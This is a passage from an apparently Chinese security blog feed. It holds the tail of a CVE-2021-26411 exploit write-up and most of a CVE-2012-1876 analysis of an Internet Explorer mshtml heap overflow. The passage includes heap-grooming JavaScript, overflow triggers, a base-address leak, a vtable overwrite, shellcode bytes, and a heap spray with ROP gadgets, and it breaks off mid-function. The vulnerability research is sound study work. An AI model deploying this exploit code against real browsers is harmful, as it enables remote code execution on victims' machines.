class="hljs-number">0xCA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>,<br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>,<br><span class="hljs-number">0xDE</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEC</span>,<br><span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xCA</span>,<br><span class="hljs-number">0x02</span> ])<br>    <span class="hljs-keyword">var</span> msi = <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">LoadLibraryExA</span>, [<span class="hljs-title function_">newStr</span>(<span class="hljs-string">&#x27;msi.dll&#x27;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]) + <span class="hljs-number">0x5000</span><br>    <span class="hljs-keyword">var</span> tmpBuffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">4</span>)<br>    <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">VirtualProtect</span>, [msi, shellcode.<span class="hljs-property">length</span>, <span class="hljs-number">0x4</span>, tmpBuffer])<br>    <span class="hljs-title function_">writeData</span>(msi, shellcode) <span class="hljs-comment">// mov eax, 0x1337 ; ret</span><br>    <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">VirtualProtect</span>, [msi, shellcode.<span class="hljs-property">length</span>, <span class="hljs-title function_">read</span>(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-title function_">call2</span>(msi, [])<br></code></pre></td></tr></table></figure><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220163212880.png" alt="image-20220220163212880"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h3><p><a href="https://enki.co.kr/blog/2021/02/04/ie_0day.html">https://enki.co.kr/blog/2021/02/04/ie_0day.html</a></p><p><a href="https://ha.cker.in/index.php/Article/17190">https://ha.cker.in/index.php/Article/17190</a></p><p><a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html</a></p><p><a href="https://paper.seebug.org/1579/">https://paper.seebug.org/1579/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2012-1876 漏洞分析与利用</title>
    <link href="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>CVE-2012-1876 </p><p>mshtml.dll中函数CTableLayout::CalculateMinMax,通过span属性值作为循环次数向堆内存中写入数据时,未对span进行有效的校验而导致堆溢出,可实现RCE.</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>调试ie,开启子进程调试,开启页堆,定位堆溢出位置</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gflags<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">i</span> iexplore<span class="hljs-selector-class">.exe</span> +hpa<br><span class="hljs-selector-class">.childdbg</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>溢出点,edi的值导致了crash,edi&#x3D;[esi+18],向上追踪esi何处被赋值</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211229114237566-16408771195061.png" alt="image-20211229114237566"></p><p>查看堆栈,CalCulateMinMax存在大量对esi的操作,对CalCulateMinMax函数下断,进行分析</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211230113908818.png" alt="image-20211230113908818"></p><p>首次加载页面,会获取一些属性,第一个参数为Table标签的类对象</p><p>ebx&#x3D;CTableLayout</p><p>ebx+0x54&#x3D;&#x3D; 所有col标签span属性值的和,标记为spannum</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207230614071.png" alt="image-20211207230614071"></p><p>如果通过判断:(this+0x94&gt;&gt;2) &lt; spannum,则通过函数EnsureSizeWorker申请空间<img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207232636863.png" alt="image-20211207232636863"></p><p>函数EnsureSizeWorker内部会进行判断,确保最小申请空间为0x1C*4&#x3D;0x70字节空间,并将地址存储入this+0x9C处</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207232431207.png" alt="image-20211207232431207"></p><p>执行完之后会对this+0x94进行更新</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207232551022.png" alt="image-20211207232551022"></p><p>通过调用函数over_trigger修改标签属性,第二次运行CalculateMinMax</p><p>此时this+0x94更新后&#x3D;&#x3D;4,(4&gt;&gt;2)&#x3D;&#x3D;spannum,所以不会再进行申请内存的操作</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207225629386.png" alt="image-20211207225629386"></p><p>此时GetAAspan返回值为0x3e8,说明span属性值已经成功被修改,但是CTableLayout成员变量并没有发生改变</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211208111707595.png" alt="image-20211208111707595"></p><p> spannum仍然为1</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211208111908997.png" alt="image-20211208111908997"></p><p>通过函数GetFancyFormat对修改后的width进行了一次运算(42765*100)&lt;&lt;4+9&#x3D;0x4141149</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211209112737753.png" alt="image-20211209112737753"></p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211209112405108.png" alt="image-20211209112405108"></p><p> 然后将参数传入,通过函数GetPixelWidth进行第二次运算,最终通过width得到的结果为0x519159</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211209113435023.png" alt="image-20211209113435023"></p><p>当运行到此处时,已经可以很明显的看出漏洞成因了,压入参数[ebp-0xc]也就是前面通过width计算出的值,通过函数AjdustForCol,循环1000次写入堆中,每次写入数据大小为0xC,而堆大小只有0x70,因为修改span后,没有重新分配相应大小的堆空间,最终会产生堆溢出.</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211209182233383.png" alt="image-20211209182233383"></p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>构造堆的布局,进行占位.让内存申请到释放的位置.</p><p>第一次溢出覆盖字符串长度,暴露mshtml基址.</p><p>第二次溢出覆盖虚表指针,构造rop,通过heapspray将shellcode喷射到覆盖的虚表指针地址,绕过DEP和ASLR保护,执行shellcode.</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>第一步申请内存空间,写入大量BSTR字符串,构造堆布局,释放存储字符”E”的堆空间,让EnsureSizeWorker申请内存时,可以占用释放的位置.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div id=<span class="hljs-string">&quot;test&quot;</span>&gt;&lt;/div&gt;<br> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;javascript&#x27;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">     d = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;test&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> dap = <span class="hljs-string">&quot;EEEE&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">while</span> (dap.<span class="hljs-property">length</span> &lt; <span class="hljs-number">0x200</span>) dap += dap;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> padding = <span class="hljs-string">&quot;AAAA&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">while</span> (padding.<span class="hljs-property">length</span> &lt; <span class="hljs-number">0x200</span>) padding += padding;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> filler = <span class="hljs-string">&quot;BBBB&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">while</span> (filler.<span class="hljs-property">length</span> &lt; <span class="hljs-number">0x200</span>) filler += filler;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> rra = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-comment">//EEEE AAAA BBBB OOOO</span></span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i += <span class="hljs-number">2</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">         rra[i] = dap.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);</span></span><br><span class="language-javascript"><span class="language-xml">         arr[i] = padding.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);</span></span><br><span class="language-javascript"><span class="language-xml">         arr[i + <span class="hljs-number">1</span>] = filler.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);</span></span><br><span class="language-javascript"><span class="language-xml">         <span class="hljs-keyword">var</span> obj = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;button&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">         d.<span class="hljs-title function_">appendChild</span>(obj);</span></span><br><span class="language-javascript"><span class="language-xml">     &#125;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-comment">//theap A B button</span></span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">200</span>; i &lt; <span class="hljs-number">1000</span>; i += <span class="hljs-number">2</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">         rra[i] = <span class="hljs-literal">null</span>;</span></span><br><span class="language-javascript"><span class="language-xml">         <span class="hljs-title class_">CollectGarbage</span>();</span></span><br><span class="language-javascript"><span class="language-xml">     &#125;</span></span><br><span class="language-javascript"><span class="language-xml"> </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>构造col标签,进行占位</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;table style=<span class="hljs-string">&quot;table-layout:fixed&quot;</span>&gt;<br>          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;41&quot;</span> <span class="hljs-attr">span</span>=<span class="hljs-string">&quot;9&quot;</span>&gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span></span><br>&lt;/table&gt;<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;table-layout:fixed&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;41&quot;</span> <span class="hljs-attr">span</span>=<span class="hljs-string">&quot;9&quot;</span>&gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br>...<br>&lt;table style=<span class="hljs-string">&quot;table-layout:fixed&quot;</span>&gt;<br>          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;132&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;41&quot;</span> <span class="hljs-attr">span</span>=<span class="hljs-string">&quot;9&quot;</span>&gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span></span><br>&lt;/table&gt;<br></code></pre></td></tr></table></figure><p>通过windbg调试,输出日志,判断是否成功占位</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">sxe ld:jscript<br>bu ntdll<span class="hljs-title">!RtlFreeHeap</span> <span class="hljs-string">&quot;.echo free heap;db poi(esp+c) l10;g&quot;</span><br>bu mshtml<span class="hljs-title">!CTableLayout</span>::CalculateMinMax<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span>C <span class="hljs-string">&quot;.echo vulheap;dd poi(ebx+9c) l4;g&quot;</span><br>.logopen <span class="hljs-keyword">c</span>:\log.txt<br></code></pre></td></tr></table></figure><p>程序成功申请到前面释放的内存,这里要去除页堆,不然成功率很低.</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211210181648025.png" alt="image-20211210181648025"></p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211214114306662.png" alt="image-20211214114306662"></p><p>当前内存布局,可以找到CButton虚表指针,需要通过它计算出mshtml基址,因为CButtonLayout虚表指针和mshtml基址的偏移是固定的,为了能够读取到这个值,需要通过溢出改变字符串B的长度,读取CButtonLayout虚表指针</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211214122355831.png" alt="image-20211214122355831"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">one_overflow</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-comment">//首次溢出,通过CButtonLayout暴露mshtml基址</span><br>          <span class="hljs-keyword">var</span> col = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-number">2</span>);<br>          col.<span class="hljs-property">span</span> = <span class="hljs-number">19</span>;<br>      &#125;<br><br>      <span class="hljs-keyword">function</span> <span class="hljs-title function_">get_mshtml_base</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-keyword">var</span> leak_addr = -<span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>              <span class="hljs-keyword">if</span> (arr[i].<span class="hljs-property">length</span> &gt; (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>) &#123;<br>                  leak_index = i;<br>                  <span class="hljs-keyword">var</span> leak = arr[i].<span class="hljs-title function_">substring</span>((<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span> + (<span class="hljs-number">2</span> + <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span> + (<span class="hljs-number">2</span> + <span class="hljs-number">8</span>) + <span class="hljs-number">4</span> / <span class="hljs-number">2</span>);<br>                  leak_addr = <span class="hljs-built_in">parseInt</span>(leak.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>) + leak.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>);<br>                  <span class="hljs-comment">//alert(&quot;CButtonLayout VirtualTable Point:0x&quot; + leak_addr.toString(16));</span><br>                  mshtml_base = leak_addr - <span class="hljs-title class_">Number</span>(<span class="hljs-number">0x001584f8</span>);<br>                  <span class="hljs-comment">//alert(&quot;mshtml base:0x&quot; + mshtml_base.toString(16));</span><br>                  <span class="hljs-title function_">heapspray</span>(mshtml_base);<br>                  <span class="hljs-keyword">break</span>;<br>              &#125;<br>          &#125;<br>      &#125;<br></code></pre></td></tr></table></figure><p>第一次溢出,长度成功被覆盖</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211216213054096.png" alt="image-20211216213054096"></p><p>通过暴露的虚表指针信息,可以找到mshtml.dll基址,偏移为:0x1584F8</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211214162949356.png" alt="image-20211214162949356"></p><p> 获取偏移后,再使用windbg调试,验证基址是否正确.</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211214164159962.png" alt="image-20211214164159962"> </p><p>第二次溢出覆盖CButtonLayout对象的虚表指针进行覆盖,控制程序执行流程</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211216214440760.png" alt="image-20211216214440760"></p><p>这里进行覆盖的值&#x3D;width*125,后面调用的虚函数地址为[eax+dc],与漏洞战争书上略有不同.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">second_overflow</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-comment">//二次溢出,覆盖CBttonLayout虚表指针</span><br>           <span class="hljs-keyword">var</span> col = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-number">2</span>);<br>           col.<span class="hljs-property">width</span> = <span class="hljs-string">&quot;1003572&quot;</span>;<br>           col.<span class="hljs-property">span</span> = <span class="hljs-string">&quot;29&quot;</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p> 成功控制执行流程.</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211230174540512.png" alt="image-20211230174540512"></p><p>下面进行heapspray,构造shellcode喷射到这个地址中.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs perl">function heapspray(base) &#123;<br>            <span class="hljs-regexp">//r</span>et<br>            var rop = (base + <span class="hljs-number">0x3142</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op ebp;ret<br>            var rop = (base + <span class="hljs-number">0x4b015a</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popebp_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popebp_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//x</span>chg eax,esp;ret<br>            var rop = (base + <span class="hljs-number">0x701be</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_xchg1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_xchg2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op ebx;ret<br>            var rop = (base + <span class="hljs-number">0x3d0537</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popebx_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popebx_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op edx;ret<br>            var rop = (base + <span class="hljs-number">0x2fb796</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popedx_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popedx_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op ecx;ret<br>            var rop = (base + <span class="hljs-number">0x17011a</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popecx_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popecx_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//</span>writable<br>            var rop = (base + <span class="hljs-number">0x100</span>).toString(<span class="hljs-number">16</span>);<br>            var writable1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var writable2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op edi;ret<br>            var rop = (base + <span class="hljs-number">0x390a67</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popedi_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popedi_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op esi;ret<br>            var rop = (base + <span class="hljs-number">0xf01bd</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popesi_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popesi_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//</span>jmp eax<br>            var 